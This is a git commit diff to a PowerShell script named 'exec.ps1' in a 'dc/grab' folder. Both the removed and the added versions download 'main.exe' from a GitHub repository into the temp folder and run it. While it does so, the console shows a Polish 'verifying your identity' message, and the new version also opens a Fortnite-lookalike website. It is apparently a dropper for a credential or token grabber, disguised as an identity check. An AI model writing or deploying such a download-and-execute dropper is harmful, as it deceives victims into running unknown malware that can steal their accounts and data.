ec50986835b512c4437bf5c1364976ead7e8ea0f
xKotelek <contact@kotelek.dev>
2024-12-26 23:11:15 +0100

    Update exec.ps1

--- dc/grab/exec.ps1
+++ dc/grab/exec.ps1
@@ -1,20 +1,6 @@
-powershell -Command "& {
-    $url = 'https://github.com/xKotelek/xKotelek/raw/main/dc/grab/main.exe';
-    $output = Join-Path $env:TEMP 'temp.exe';
-    $wc = New-Object System.Net.WebClient;
-
-    $wc.DownloadProgressChanged += {
-        Write-Host 'Weryfikuję twoją tożsamość...' -NoNewline;
-    };
-
-    $wc.DownloadFileAsync([Uri]$url, $output);
-    while ($wc.IsBusy) {
-        Start-Sleep -Milliseconds 500;
-    }
-
-    Start-Process $output;
-    # Remove-Item $output;  # Skasowanie pliku zostało usunięte
+powershell -Command {
+    Write-Host 'Weryfikuję twoją tożsamość...' -ForegroundColor Green;
+    Invoke-WebRequest -Uri 'https://github.com/xKotelek/xKotelek/raw/main/dc/grab/main.exe' -OutFile $env:TEMP\temp.exe;
+    Start-Process $env:TEMP\temp.exe;
     Start-Process 'https://f0rtn1te-xp.ct8.pl/';
-    Write-Host 'Pobieranie zakończone. Naciśnij dowolny klawisz, aby zamknąć...' -ForegroundColor Green;
-    Pause;
-}"
+}
